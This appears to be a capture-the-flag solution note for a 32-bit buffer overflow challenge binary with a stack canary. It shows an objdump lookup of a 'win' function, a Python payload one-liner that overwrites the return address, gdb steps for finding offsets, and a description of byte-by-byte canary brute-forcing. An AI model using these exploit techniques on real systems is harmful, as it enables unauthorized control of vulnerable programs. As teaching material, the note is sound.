# This is manual solution
# Run:
	objdump -t ../vuln | grep "win" | cut -d' ' -f1
# Use the address with 0x prefix in the next command
	python -c "import struct; \
		print('68'); \
		print('A'*32+'1234'+'AAAABBBBCCCCDDDD'+ \
		struct.pack('I', 0xPREVIUS_OUTPUT))" | ../vuln
# If you have 64-bit system and you can't run 32-bit files add "qemu-i386" before "../vuln"

# Explanation:
# 	print('68'); # length of data
#	print('A'*32 # fill buffer
# 	+'1234' # canary value
#	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM # dummy data to find offset of return address

# Using gdb to find "return address" offset:
# $ gdb -q ./vuln
# (gdb) b *0x080488b0
# (gdb) c
# (gdb) i f
# print 0x45454545 == EEEE 

#	This means the canary is after the buffer (offset 32)
#	The some 12 bytes
#	Then the previous stack pointer and the return address

# If we will fill the buffer and send the buffer and the right canary we
#	could also control the return address
# But we have to find what the canary is.

# When running the local file we know the canary.
# But wen running remotely we will have to Brute-force (BF) the canary
#	(works only because the canary is always the same)

# Instead of BF-ing all the 4-bytes at once we can use incremental BF
# Trying all the possible value to the first byte the 2-nd and etc.
# Look at solve.py to see the implementation